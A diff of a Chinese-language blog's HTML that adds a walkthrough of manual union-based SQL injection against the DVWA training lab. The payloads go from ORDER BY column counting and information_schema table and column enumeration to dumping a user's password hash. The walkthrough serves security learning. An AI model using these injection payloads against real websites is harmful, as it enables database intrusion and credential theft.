@@ -154,6 +154,133 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/sql_injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="沫">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="沫的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/02/08/sql_injection/" class="post-title-link" itemprop="url">DVWA-sql注入手注（low）</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-08 15:01:00" itemprop="dateCreated datePublished" datetime="2020-02-08T15:01:00+08:00">2020-02-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-02-12 13:42:51" itemprop="dateModified" datetime="2020-02-12T13:42:51+08:00">2020-02-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h6 id="1-判断查询语句的字段数量，对字段进行确认"><a href="#1-判断查询语句的字段数量，对字段进行确认" class="headerlink" title="1.判断查询语句的字段数量，对字段进行确认"></a>1.判断查询语句的字段数量，对字段进行确认</h6><p><span style="color:blue;">order by 命令是对字段进行升序和降序，可以通过第几个字段进行操作</span></p>
+<p>例：pyload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 2<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:green;">mysql执行命令为</span></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_account <span class="keyword">where</span> <span class="keyword">id</span> = <span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">回显数据正常，那么表示他语句中包含了2个字段</span></p>
+<p><img src="/images/pasted-5.png" alt="upload successful"></p>
+<h6 id="2-确定显示的位置-sql语句查询后的回显位置-对字段进行填充"><a href="#2-确定显示的位置-sql语句查询后的回显位置-对字段进行填充" class="headerlink" title="2.确定显示的位置(sql语句查询后的回显位置),对字段进行填充"></a>2.确定显示的位置(sql语句查询后的回显位置),对字段进行填充</h6><p>union select 相当于补充了一行新的查询</p>
+<p>例：pyload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们已经成功执行了命令并且获取了回显</p>
+<p><img src="/images/pasted-6.png" alt="upload successful"></p>
+<p><span style="color:green;">mysql执行命令为</span></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_account <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="3-获取当前数据库的名称以及版本号"><a href="#3-获取当前数据库的名称以及版本号" class="headerlink" title="3.获取当前数据库的名称以及版本号"></a>3.获取当前数据库的名称以及版本号</h6><p>例：pyload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'  union <span class="keyword">select</span>  <span class="keyword">database</span>(),<span class="keyword">version</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><span style="color:blue;">可以看到返回的数据库名称是dvwa这个库  数据库版本号为5.5.53</span></p>
+<p><img src="/images/pasted-7.png" alt="upload successful"></p>
+<p><span style="color:green;">mysql执行命令为</span></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> test_mo <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">database</span>(),<span class="keyword">version</span>()</span><br></pre></td></tr></table></figure>
+
+<h6 id="4-获取数据库中的所有表"><a href="#4-获取数据库中的所有表" class="headerlink" title="4.获取数据库中的所有表"></a>4.获取数据库中的所有表</h6><p>例：pyload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>()<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">现在可以看到他有两张表，分别是guestbook和users</span></p>
+<p><img src="/images/pasted-8.png" alt="upload successful"></p>
+<p><span style="color:green;">mysql执行命令为</span></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> dvwa <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="keyword">database</span>();</span><br></pre></td></tr></table></figure>
+
+
+<p>低版本命令执行失败<br>在低版本中无法使用<span style="color:#f00;">information_schema</span>命令所以会给出错误提示 <span style="color:#f00;">Illegal mix of collations for operation ‘UNION’</span></p>
+<h6 id="5-获取数据库中的所有字段"><a href="#5-获取数据库中的所有字段" class="headerlink" title="5.获取数据库中的所有字段"></a>5.获取数据库中的所有字段</h6><p>例：pyload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1'  union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>现在已经拿到了users这张表的所有字段</p>
+<p><img src="/images/pasted-9.png" alt="upload successful"></p>
+<p><span style="color:green;">mysql执行命令为</span></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_account <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'mo_account'</span>;</span><br></pre></td></tr></table></figure>
+
+<p>低版本命令执行失败<br>在低版本中无法使用<span style="color:#f00;">information_schema</span>命令所以会给出错误提示 <span style="color:#f00;">Illegal mix of collations for operation ‘UNION’</span></p>
+<h6 id="6-获取数据库中字段数据"><a href="#6-获取数据库中字段数据" class="headerlink" title="6.获取数据库中字段数据"></a>6.获取数据库中字段数据</h6><p>例：pyload</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">union</span> <span class="keyword">select</span>  <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id =<span class="number">1</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p><span style="color:blue;">通过我刚刚获取的字段，进行查询获取密码  这条命令可以获取id为1的账号密码</span></p>
+<p><img src="/images/pasted-10.png" alt="upload successful"></p>
+<p><span style="color:green;">mysql执行命令为</span></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> mo_test <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> user_id =<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="攻击总结"><a href="#攻击总结" class="headerlink" title="攻击总结"></a>攻击总结</h6><pre><code>有时候手动注入需要注释掉原sql语句的&apos;   可以通过 -- 或者 # （攻击思路）
+用户的数据是不可信的，坚信这一点我们就会避免很多被入侵的机会。</code></pre>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/06/python_F_Q/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -326,20 +453,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-count">12</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-count">20</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -427,5 +554,5 @@
 
   
 
-</body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
